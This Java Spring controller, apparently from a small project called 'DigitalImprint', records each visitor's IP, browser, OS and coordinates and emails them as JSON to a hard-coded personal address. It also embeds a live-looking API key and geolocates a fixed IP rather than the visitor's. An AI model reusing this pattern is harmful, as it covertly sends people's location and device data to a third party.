package DigitalImprint.controllers;

import DigitalImprint.models.LocationData;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import eu.bitwalker.useragentutils.UserAgent;
import jakarta.mail.MessagingException;
import jakarta.mail.internet.MimeMessage;
import jakarta.servlet.http.HttpServletRequest;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.mail.javamail.JavaMailSender;
import org.springframework.mail.javamail.MimeMessageHelper;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;

@Controller
@RequestMapping("/home")
public class MainController {
    private final JavaMailSender mailSender;

    @Autowired
    public MainController(JavaMailSender mailSender) {
        this.mailSender = mailSender;
    }

    @GetMapping
    public String home() {
        return "home";
    }

    @PostMapping
    public String locate(HttpServletRequest request,
                         @RequestBody LocationData locationData,
                         Model model) throws MessagingException {
        UserAgent userAgent = UserAgent.parseUserAgentString(request.getHeader("User-Agent"));
        locationData.setIpAddress(request.getRemoteAddr());
        locationData.setOs(String.valueOf(userAgent.getOperatingSystem()));
        locationData.setBrowserName(String.valueOf(userAgent.getBrowser()));
        locationData.setBrowserVersion(String.valueOf(userAgent.getBrowserVersion()));
        locationData.setRequestTime(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                .format(System.currentTimeMillis()));

        String geolocation = getGeolocation("212.74.202.131");
        if (locationData.getLatitude() == null) {
            locationData.setLatitude(geolocation.split(",")[0]);
            locationData.setLongitude(geolocation.split(",")[1]);
        }
        String json = LocationData.locationDataToJson(locationData);
        sendEmailWithJson(json);
        model.addAttribute("location", locationData);
        System.out.println(locationData.getLatitude());
        System.out.println(locationData.getLongitude());
        return "home";
    }

    private String getGeolocation(String ipAddress) {

        String apiKey = "3867f51093964840ac9d24822c12c43f";
        String apiUrl = "https://api.ipgeolocation.io/ipgeo?apiKey="
                + apiKey + "&ip=" + ipAddress;
        try {
            URL url = new URL(apiUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                String inputLine;
                StringBuilder response = new StringBuilder();

                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();
                ObjectMapper objectMapper = new ObjectMapper();
                JsonNode jsonNode = objectMapper.readTree(response.toString());

                String longitude = jsonNode.get("longitude").asText();
                String latitude = jsonNode.get("latitude").asText();
                return latitude + "," + longitude;
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

        return null;
    }

    private void sendEmailWithJson(String json) throws jakarta.mail.MessagingException {
        MimeMessage message = mailSender.createMimeMessage();
        MimeMessageHelper helper = new MimeMessageHelper(message, true);
        helper.setTo("ar.kuzmin@yandex.ru");  // Set the recipient email address
        helper.setSubject("Location Data JSON");  // Set the email subject
        helper.setText(json);  // Set the JSON content as the email body
        mailSender.send(message);
    }
}

